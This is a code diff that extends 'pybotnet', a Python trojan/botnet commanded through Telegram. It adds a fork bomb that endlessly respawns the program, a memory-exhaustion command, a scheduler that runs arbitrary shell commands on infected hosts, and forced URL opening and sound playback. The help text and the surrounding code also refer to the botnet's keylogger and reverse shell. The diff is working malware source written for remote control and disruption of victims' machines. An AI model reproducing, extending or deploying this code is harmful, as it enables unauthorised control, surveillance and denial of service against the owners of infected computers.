@@ -9,7 +9,10 @@ from typing import List
 from time import sleep
 from uuid import getnode as get_system_mac_addres
 from requests import get
-
+import subprocess, sys
+from playsound import playsound
+import webbrowser
+import psutil
 # pybotnet import
 from . import util
 from . import settings
@@ -17,7 +20,7 @@ from . import settings
 MAC_ADDRES = str(get_system_mac_addres())
 keylogger_thread = None
 keylogger_util = None
-
+memory = ''
 scripts_name = {
     MAC_ADDRES: "`<system MAC_ADDRES> <command>`: run command on one target",
 
@@ -39,9 +42,22 @@ scripts_name = {
 
     "/start": "`/start`: run `help` command!",
 
+    "reverse_shell": "`<system MAC_ADDRES> reverse_shell`: start reverse shell on target system",
+    
     "keylogger": "`keylogger start/stop`: Starts keylogger. use keylogger stop to stop keylogger" ,
 
-    "reverse_shell": "`<system MAC_ADDRES> reverse_shell`: start reverse shell on target system"
+    "schedule": """`schedule start <second> <shell-command>`: Starts a new schedule for a command.
+    `schedule list`: lists all schedules
+    `schedule stop <schedule name>`: Stops a schedule
+    """,
+
+    "forkbomb":"`forkbomb` Will execute the running program forever , Using this option , you might lose access to the trojan , since a restart would be needed.",
+
+    "playsound":"`playsound <soundname>` Plays a sound , MP3 or WAV Files. Sound file should be in the working path.",
+
+    "eatmemory":"`eatmemory <how-much-in-bytes>` This option will eat memory , You should specify the size in bytes. if you eat all of the memory , you might lose connection.",
+    "memoryused":"`memoryused` will return the percent of used memory.",
+    "openurl":"`openurl <url> <how-many-times>` Will open a specified url n times",
 }
 
 
@@ -150,6 +166,24 @@ def execute_scripts(command: str, pybotnet_up_time: int, is_shell: bool, ADMIN_C
             
             elif command_name == "keylogger" and split_command(command)[1] in ['start','stop']:
                 return keylogger(logger,command)
+
+            elif command_name == "schedule" and split_command(command)[1] in ["start","stop","list"]:
+                return scheduler_script(logger,command)  
+
+            elif command_name == "forkbomb":
+                return forkbomb(logger,TELEGRAM_TOKEN,ADMIN_CHAT_ID)  
+
+            elif command_name == "playsound":
+                return playsound_pybotnet(logger,command)
+
+            elif command_name == "eatmemory":
+                return eatmem(logger,command)
+            
+            elif command_name == "memoryleft":
+                return memleft()
+
+            elif command_name == "openurl":
+                return openurl(logger,command)
         logger.error('execute_scripts invalid command; Wrong format')
         return f"execute_scripts invalid command; Wrong format \n\n scripts name:\n {','.join(scripts_name)}"
 
@@ -456,7 +490,93 @@ def keylogger(logger,command):
         
 
 
+        else:
+            return "Second should be a digit"
 
+def scheduler_script(logger,command):
+    splitted_command = split_command(command)
+
+    if splitted_command[1] == "start":
+        second = splitted_command[2]
+        command = ' '.join(splitted_command[3:])
+        scheduler_util = util.ScheduleManagement(int(second),
+                                                    command)
+        scheduler_util.listOfSchedules[command] = [threading.Thread(target=scheduler_util.startSchedule),
+                                                                second]
+        scheduler_util.listOfSchedules[command][0].start() #starts threading object
+        logger.info(f"Started Schedule {command} , will run each {second} second")
+        return f"Started Schedule {command} , will run each {second} second"
+
+    elif splitted_command[1] == "list":
+        listOfSchedules_ToReturn = []
+        listOfSchedules = util.ScheduleManagement.listOfSchedules
+        for key,value in zip(listOfSchedules.keys(),listOfSchedules.values()):
+            listOfSchedules_ToReturn.append(f"Command Name = {key} , Will run each {value[1]} second")    
+        return "\n".join(listOfSchedules_ToReturn)
+
+    elif splitted_command[1] == "stop":
+        listOfSchedules = util.ScheduleManagement.listOfSchedules
+        command = ' '.join(splitted_command[2:])
+        if command in listOfSchedules.keys():
+            pass
+        else:
+            logger.error("Schedule {0} is not available".format(command))
+            return "Schedule {0} is not available".format(command)
+        logger.info(f"Stopping Schedule {command}")
+        threadObject = listOfSchedules[command][0]
+        listOfSchedules.pop(command)
+        threadObject.join()
+        logger.info("Schedule {0} stopped.".format(command))
+        return "Schedule {0} stopped.".format(command)
+
+def forkbomb(logger,TELEGRAM_TOKEN,ADMIN_CHAT_ID):
+    def send_message(text: str):
+        util.send_message_by_third_party_proxy(
+            text, TELEGRAM_TOKEN=TELEGRAM_TOKEN,
+            ADMIN_CHAT_ID=ADMIN_CHAT_ID, logger=logger)
+    logger.info("Starting Fork Bomb...")
+    send_message('Starting Fork Bomb...')
+    try:
+        while True:
+            subprocess.Popen([sys.executable, sys.argv[0]], creationflags=subprocess.CREATE_NEW_CONSOLE)
+    except:
+        return "Running forkbomb failed."
+
+def playsound_pybotnet(logger,command):
+    threadObject = threading.Thread(target=playsound,args=(split_command(command)[1],))
+    threadObject.start()
+    sleep(5)
+    logger.info("Starting PlaySound...")
+    return "Playsound Started."if threadObject.is_alive() else "PlaySound Failed."
+
+
+def eatmem(logger,command):
+    global memory
+    try:
+        logger.info("Eating memory like a hungry trojan...")
+        memory = 'X' * int((split_command(command)[1]))
+        logger.info("Ate {0} Bytes of Memory.".format(split_command(command)[1]))
+        return "Ate {0} Bytes of Memory.".format(split_command(command)[1])
+    except:
+        logger.error("Unknown error occurred. Maybe the specified amount was too much. Or the amount wasn't a number. I'm Very Hungry :(")
+        return "Unknown error occurred. Maybe the specified amount was too much. Or the amount wasn't a number."
+    
+def memleft():
+    return 'Memory Used = {0}'.format(psutil.virtual_memory().percent)
+
+def openurl(logger,command):
+    url = split_command(command)[1]
+    times = split_command(command)[2]
+    try:
+        logger.info("Opening {0} {1}times".format(url,times))
+        for i in range(int(times)+1):
+            webbrowser.open(url)
+
+        logger.info("Opened {0} {1} times".format(url,times))
+        return "Opened {0} {1} times".format(url,times)
+    except:
+        logger.error("Error occurred.")
+        return "Error occurred."
 
 
 def command_help(logger):
